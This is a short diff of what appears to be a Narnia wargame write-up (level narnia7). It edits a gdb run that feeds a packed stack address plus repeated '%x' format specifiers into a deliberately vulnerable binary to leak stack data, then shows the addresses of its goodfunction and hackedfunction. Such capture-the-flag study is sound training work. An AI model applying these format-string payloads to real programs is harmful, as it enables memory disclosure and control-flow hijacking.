@@ -140,7 +140,7 @@ Continuing.
 Welcome to the goodfunction, but i said the Hackedfunction..
 [Inferior 1 (process 122) exited normally]
 (gdb) r $(python -c'print "\x4c\xd6\xff\xff"+"%x"*50')
-Starting program: /narnia/narnia7 $(python -c'print "\x4c\xd6\xff\xff"+"%x"*50') ########### let's see what %x shows
+Starting program: /narnia/narnia7 $(python -c'print "\x0c\xd6\xff\xff"+"%x"*50') ########### let's see what %x shows
 goodfunction() = 0x80486e0
 hackedfunction() = 0x8048706
 
